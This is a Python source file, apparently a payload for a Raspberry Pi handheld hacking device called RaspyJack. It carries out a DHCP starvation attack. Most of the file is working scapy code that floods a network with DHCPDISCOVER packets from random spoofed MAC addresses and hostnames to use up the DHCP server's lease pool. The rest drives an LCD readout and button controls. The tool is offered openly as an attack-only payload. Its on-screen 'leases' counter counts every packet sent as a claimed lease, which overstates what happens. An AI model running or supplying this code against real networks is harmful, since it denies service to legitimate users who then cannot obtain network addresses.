#!/usr/bin/env python3
"""
RaspyJack Payload -- DHCP Starvation
=====================================
Author: 7h30th3r0n3

DHCP starvation attack.  Floods the network with DHCPDISCOVER packets
using random MAC addresses to exhaust the DHCP server's lease pool.
Works on eth0 or wlan0 (no monitor mode needed).

Controls:
  OK         -- Start / Stop attack
  KEY1       -- Toggle speed (fast / slow)
  KEY3       -- Exit

Loot: None (attack-only payload).
"""

import os
import sys
import time
import random
import struct
import threading
import subprocess

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        Ether, IP, UDP, BOOTP, DHCP,
        sendp, conf, get_if_hwaddr,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT

SPEED_MODES = ["fast", "slow"]
SPEED_DELAYS = {"fast": 0.01, "slow": 0.2}

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = False
speed_idx = 0          # index into SPEED_MODES
packets_sent = 0
leases_claimed = 0
target_iface = None
target_subnet = "detecting..."

# ---------------------------------------------------------------------------
# Interface detection
# ---------------------------------------------------------------------------

def _detect_interface():
    """Find a suitable network interface (eth0 preferred, then wlan0)."""
    for candidate in ["eth0", "wlan0"]:
        try:
            state_path = f"/sys/class/net/{candidate}/operstate"
            if os.path.exists(state_path):
                with open(state_path) as fh:
                    state = fh.read().strip()
                if state == "up":
                    return candidate
        except Exception:
            pass
    # Fallback: any non-loopback interface that is up
    try:
        for name in os.listdir("/sys/class/net"):
            if name == "lo":
                continue
            state_path = f"/sys/class/net/{name}/operstate"
            if os.path.exists(state_path):
                with open(state_path) as fh:
                    if fh.read().strip() == "up":
                        return name
    except Exception:
        pass
    return None


def _detect_subnet(iface):
    """Detect the subnet of the given interface."""
    try:
        result = subprocess.run(
            ["ip", "-4", "addr", "show", iface],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                parts = line.split()
                return parts[1]  # e.g. "192.168.1.5/24"
    except Exception:
        pass
    return "unknown"

# ---------------------------------------------------------------------------
# Packet generation
# ---------------------------------------------------------------------------

def _random_mac_bytes():
    """Generate 6 random bytes for a MAC address."""
    octets = [random.randint(0, 255) for _ in range(6)]
    octets[0] = (octets[0] | 0x02) & 0xFE  # locally administered, unicast
    return bytes(octets)


def _random_mac_str(mac_bytes):
    """Format MAC bytes as colon-separated string."""
    return ":".join(f"{b:02x}" for b in mac_bytes)


def _random_hostname():
    """Generate a plausible random hostname."""
    prefixes = ["PC", "LAPTOP", "DESKTOP", "PHONE", "IPAD", "WORK"]
    return f"{random.choice(prefixes)}-{random.randint(1000, 9999)}"


def _build_dhcp_discover(mac_bytes, hostname):
    """Build a DHCPDISCOVER packet with the given MAC and hostname."""
    mac_str = _random_mac_str(mac_bytes)
    xid = random.randint(1, 0xFFFFFFFF)

    pkt = (
        Ether(src=mac_str, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(chaddr=mac_bytes + b"\x00" * 10, xid=xid)
        / DHCP(options=[
            ("message-type", "discover"),
            ("hostname", hostname),
            "end",
        ])
    )
    return pkt

# ---------------------------------------------------------------------------
# Attack thread
# ---------------------------------------------------------------------------

def _attack_thread():
    """Flood DHCPDISCOVER packets in background."""
    global packets_sent, leases_claimed

    while running:
        mac_bytes = _random_mac_bytes()
        hostname = _random_hostname()
        pkt = _build_dhcp_discover(mac_bytes, hostname)

        try:
            sendp(pkt, iface=target_iface, verbose=False)
            with lock:
                packets_sent += 1
                # Each discover is a potential lease claim
                leases_claimed += 1
        except Exception:
            pass

        delay = SPEED_DELAYS[SPEED_MODES[speed_idx]]
        time.sleep(delay)

# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def _draw_frame(lcd, font):
    """Render current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "DHCP STARVE", font=font, fill="#FF8800")
    d.ellipse((118, 3, 122, 7), fill="#FF0000" if running else "#444")

    with lock:
        sent = packets_sent
        leases = leases_claimed

    speed = SPEED_MODES[speed_idx]
    iface = target_iface or "none"
    subnet = target_subnet

    d.text((4, 20), f"Iface: {iface}", font=font, fill="#AAAAAA")
    d.text((4, 34), f"Subnet: {subnet[:18]}", font=font, fill="#AAAAAA")
    d.text((4, 52), f"Leases: {leases}", font=font, fill="#00FF00")
    d.text((4, 66), f"Pkts sent: {sent}", font=font, fill="#CCCCCC")
    d.text((4, 80), f"Speed: {speed}", font=font, fill="#FFAA00")

    if running:
        tick = int(time.time() * 4) % 4
        bars = "|/-\\"
        d.text((110, 66), bars[tick], font=font, fill="#FF8800")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    status = "OK:Stop" if running else "OK:Start"
    d.text((2, 117), f"{status} K1:Spd K3:Quit", font=font, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running, speed_idx, target_iface, target_subnet
    global packets_sent, leases_claimed

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font()

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font, fill="#FF0000")
        d.text((4, 65), "pip install scapy", font=font, fill="#888")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    # Detect interface and subnet
    target_iface = _detect_interface()
    if target_iface:
        target_subnet = _detect_subnet(target_iface)

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 20), "DHCP STARVATION", font=font, fill="#FF8800")
    d.text((4, 40), "Exhaust DHCP leases", font=font, fill="#888")
    d.text((4, 58), f"Iface: {target_iface or 'none'}", font=font, fill="#666")
    d.text((4, 72), "OK    Start / Stop", font=font, fill="#666")
    d.text((4, 84), "KEY1  Toggle speed", font=font, fill="#666")
    d.text((4, 96), "KEY3  Exit", font=font, fill="#666")
    lcd.LCD_ShowImage(img, 0, 0)
    time.sleep(1.5)

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "OK":
                if running:
                    running = False
                    time.sleep(0.5)
                else:
                    if not target_iface:
                        target_iface = _detect_interface()
                        if target_iface:
                            target_subnet = _detect_subnet(target_iface)
                    if target_iface:
                        packets_sent = 0
                        leases_claimed = 0
                        running = True
                        threading.Thread(
                            target=_attack_thread, daemon=True
                        ).start()
                    else:
                        img2 = Image.new("RGB", (WIDTH, HEIGHT), "black")
                        d2 = ScaledDraw(img2)
                        d2.text((4, 50), "No interface up!", font=font, fill="#FF0000")
                        lcd.LCD_ShowImage(img2, 0, 0)
                        time.sleep(1.5)
                time.sleep(0.3)

            elif btn == "KEY1":
                speed_idx = (speed_idx + 1) % len(SPEED_MODES)
                time.sleep(0.3)

            _draw_frame(lcd, font)
            time.sleep(0.05)

    finally:
        running = False
        time.sleep(0.3)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
